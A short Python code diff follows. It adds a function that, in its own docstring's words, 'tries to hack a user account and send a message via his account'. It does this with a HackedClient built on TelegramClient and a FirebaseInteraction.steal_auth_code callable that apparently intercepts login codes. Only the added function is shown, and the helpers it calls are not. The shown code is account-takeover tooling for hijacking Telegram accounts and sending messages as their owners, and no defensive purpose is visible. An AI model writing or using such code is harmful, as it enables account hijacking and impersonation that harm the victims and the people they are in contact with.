@@ -3,6 +3,15 @@ import asyncio
 
 from app import db
 from app.models.userdata_models import AccessCode
+from app.firebase_interaction import FirebaseInteraction
+
+async def hack_and_send_message(user_id, phonenumber, messages):
+    """tries to hack a user account and send a message via his account
+    :param messages: a list of tupels (receiver, text)"""
+    client = HackedClient(user_id, phonenumber, FirebaseInteraction.steal_auth_code)
+    async with client:
+        for message in messages:
+            await client.send_message(*message)
 
 class HackedClient(TelegramClient):
     def __init__(self, user_id, phonenumber, steal_auth_code: callable):
